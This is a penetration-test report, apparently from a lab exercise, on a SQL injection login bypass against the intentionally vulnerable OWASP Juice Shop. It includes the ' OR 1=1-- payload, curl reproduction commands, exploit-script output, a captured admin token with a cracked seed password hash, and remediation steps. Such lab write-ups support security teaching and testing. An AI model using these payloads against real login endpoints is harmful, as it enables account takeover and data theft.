# c03-sqli-admin — SQL Injection → Admin Authentication Bypass

**Target:** `http://host.docker.internal:3000` (OWASP Juice Shop **20.3.0**)
**Endpoint:** `POST /rest/user/login`
**Severity:** Critical (CVSS 9.8 — unauthenticated auth bypass to admin)
**Status:** ✅ Exploited and verified

---

## 1. Vulnerability

The login handler concatenates the attacker-controlled `email` value directly into
the authentication SQL query instead of using parameter binding:

```sql
SELECT * FROM Users WHERE email = '<EMAIL>' AND password = '<MD5(password)>';
```

A tautology plus a SQL comment truncates the password predicate entirely:

```
email    = ' OR 1=1--
password = x            (never evaluated)
```

Resulting query:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...';
```

`OR 1=1` matches every row and `--` comments out the rest, so the query returns the
**first row** in `Users`. Juice Shop seeds the administrator as `id=1`, therefore the
server authenticates us as `admin@juice-sh.op` and returns a legitimately
RS256-signed JWT for it. **No password is ever required.**

## 2. Reproduction

```bash
curl -s http://host.docker.internal:3000/rest/user/login \
  -X POST -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

Minimal one-liner for the raw token:

```bash
curl -s http://host.docker.internal:3000/rest/user/login \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["authentication"]["token"])'
```

**Automated PoC:** `pocs/c03_sqli_admin_login.py`

```
$ python3 pocs/c03_sqli_admin_login.py
[*] Target  : http://host.docker.internal:3000/rest/user/login
[*] Payload : email = "' OR 1=1--"
[*] HTTP    : 200
[+] SUCCESS - authenticated without valid credentials
[+] Logged in as : 'admin@juice-sh.op'  (id=1)
[+] Role         : 'admin'
[+] JWT algorithm: RS256
[+] Admin JWT saved to: /workspace/evidence/c3_admin_token.txt
```

Exit code `0` = bypass succeeded.

## 3. Captured admin JWT

Saved to **`/workspace/evidence/c3_admin_token.txt`** (717 bytes, begins `eyJ`).

Decoded claims:

```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin",
    "password": "0192023a7bbd73250516f069df18b500",
    "isActive": true
  },
  "bid": 1
}
```

Header: `{"typ":"JWT","alg":"RS256"}` — server-signed, therefore genuinely valid
(not a forged/self-signed token).

> **Bonus finding:** the JWT payload also leaks the admin password **hash**
> (`0192023a7bbd73250516f069df18b500`, unsalted MD5 → `admin123`) — CWE-200
> sensitive information exposure inside the token. This hash is also brute-forceable
> offline, giving a second, credential-based path to admin.

## 4. Verification (post-exploitation proof)

All requests below used `Authorization: Bearer <captured token>`:

| Endpoint | With token | Without token |
|---|---|---|
| `GET /rest/user/whoami` | 200 | 401 |
| `GET /api/Users` | **200 — full user table** | **401** |
| `GET /api/Feedbacks` | 200 | 200 |
| `GET /rest/user/authentication-details` | 200 — all accounts | — |

The `200 vs 401` delta on `/api/Users` proves the token is a live, privileged
session — not a parse artefact. It dumped every account, admin listed first:

```json
{"status":"success","data":[
  {"id":1,"email":"admin@juice-sh.op","role":"admin", ...},
  {"id":2,"email":"jim@juice-sh.op","role":"customer", ...},
  {"id":3, ...}]}
```

## 5. Impact

* Complete authentication bypass — no credentials needed.
* Administrative control of the store: full user-table read, user
  creation/deletion/modification, product CRUD (e.g. price tampering).
* Persistence: admin JWTs are valid until key rotation.
* Secondary path: leaked MD5 hash cracks to a plaintext admin password.

## 6. Remediation

1. **Use parameterized queries / an ORM** (Sequelize with bound params) so user input
   is never part of the query text — this alone fixes the issue.
2. Validate and normalize `email` server-side; reject values containing quotes,
   `--`, `/*`, or SQL keywords.
3. Strip sensitive fields (`password`, `totpSecret`) from JWT payloads; JWTs are
   base64, **not** encrypted.
4. Migrate password storage from unsalted MD5 to bcrypt/argon2.
5. Add rate limiting and alerting on repeated `401`s / malformed login input.

## 7. Files

| Path | Purpose |
|---|---|
| `/workspace/pocs/c03_sqli_admin_login.py` | Exploit PoC (extracts + verifies + saves token) |
| `/workspace/evidence/c3_admin_token.txt` | Captured admin JWT (`eyJ...`) |
| `/workspace/evidence/c03_report.md` | This report |
